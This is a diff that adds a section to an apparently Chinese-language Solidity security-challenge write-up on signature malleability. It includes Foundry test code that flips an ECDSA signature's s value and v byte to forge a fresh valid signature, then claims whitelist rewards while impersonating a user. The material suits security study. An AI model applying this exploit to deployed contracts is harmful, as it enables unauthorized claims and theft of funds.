@@ -44,3 +44,30 @@ abi.encodeWithSignature("upgradeTo(address)", address(blank))
 // 需要用到aave测试网络的部署合约
 forge test --match-contract LoanTest -vvvv --fork-url https://eth-sepolia.g.alchemy.com/v2/XXX
 ```
+
+## 3. Signature malleability
+
+claim奖励需要用户是白名单地址, 且能提供未使用的签名,
+题目给出了之前的白名单用户使用过的签名
+使用"数学魔法"(⚡️)用旧签名构造新的且有效的签名
+
+数学原理:https://github.com/kadenzipfel/smart-contract-vulnerabilities/blob/master/vulnerabilities/signature-malleability.md
+
+- 椭圆曲线X轴对称, 一个签名一定有另一个对称值
+- 如果(r, s)有效, 则(r, -s mod n)也有效
+
+```solidity
+// The following is math magic to invert the signature and create a valid one
+// flip s (secp256k1 curve)
+bytes32 s2 = bytes32(uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141) - uint256(s));
+
+// invert v
+uint8 v2;
+require(v == 27 || v == 28, "invalid v");
+v2 = v == 27 ? 28 : 27;
+
+vm.prank(user);
+rewards.claim(user, whitelistedAmount, v2, r, s2);
+```
+
+案例:https://github.com/tendermint/tendermint/issues/1958
